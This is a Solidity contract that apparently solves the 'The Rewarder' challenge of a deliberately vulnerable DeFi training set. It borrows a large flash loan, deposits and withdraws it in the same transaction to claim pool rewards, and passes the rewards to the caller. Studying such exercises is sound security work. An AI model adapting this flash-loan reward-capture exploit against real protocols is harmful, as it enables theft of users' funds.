// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract RewarderAttacker {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public rewardToken;

    constructor(
        FlashLoanerPool _pool,
        DamnValuableToken _token,
        TheRewarderPool _rewardPool,
        RewardToken _rewardToken
    ) {
        pool = _pool;
        token = _token;
        rewardPool = _rewardPool;
        rewardToken = _rewardToken;
    }

    function attack() external {
        pool.flashLoan(1000000 ether);
    }

    function receiveFlashLoan(uint256 _amount) external {
        token.approve(address(rewardPool), _amount);
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);
        token.transfer(address(pool), _amount);
        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
    }
}
